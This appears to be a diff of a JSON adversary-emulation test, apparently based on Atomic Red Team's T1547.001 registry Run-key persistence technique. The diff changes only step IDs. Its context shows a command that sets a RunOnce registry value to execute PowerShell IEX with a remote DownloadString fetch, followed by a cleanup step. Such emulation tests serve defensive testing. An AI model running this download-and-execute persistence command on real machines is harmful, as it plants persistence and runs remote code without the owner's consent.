@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "cb2dfb2f-85f1-424a-a28d-f16f24b91b3f",
+      "id": "b56cff97-abb5-5b00-9c71-7b3e58979d52",
       "type": "execute-command",
       "data": {
         "command": "$RunOnceKey = \"#{reg_key_path}\"\nset-itemproperty $RunOnceKey \"NextRun\" '#{thing_to_execute} \"IEX (New-Object Net.WebClient).DownloadString(`\"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\")\"'",
@@ -16,7 +16,7 @@
       "elevation_required": true
     },
     {
-      "id": "bee6e397-0741-4703-9044-6b74aabee502",
+      "id": "cdcc078c-94b9-52ab-a5f4-cf702f7fbab6",
       "type": "execute-command",
       "data": {
         "command": "Remove-ItemProperty -Path #{reg_key_path} -Name \"NextRun\" -Force -ErrorAction Ignore",
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "cb2dfb2f-85f1-424a-a28d-f16f24b91b3f",
+      "s": "b56cff97-abb5-5b00-9c71-7b3e58979d52",
       "p": "on-success",
-      "o": "bee6e397-0741-4703-9044-6b74aabee502"
+      "o": "cdcc078c-94b9-52ab-a5f4-cf702f7fbab6"
     },
     {
-      "s": "cb2dfb2f-85f1-424a-a28d-f16f24b91b3f",
+      "s": "b56cff97-abb5-5b00-9c71-7b3e58979d52",
       "p": "on-failure",
-      "o": "bee6e397-0741-4703-9044-6b74aabee502"
+      "o": "cdcc078c-94b9-52ab-a5f4-cf702f7fbab6"
     }
   ],
   "tags": [
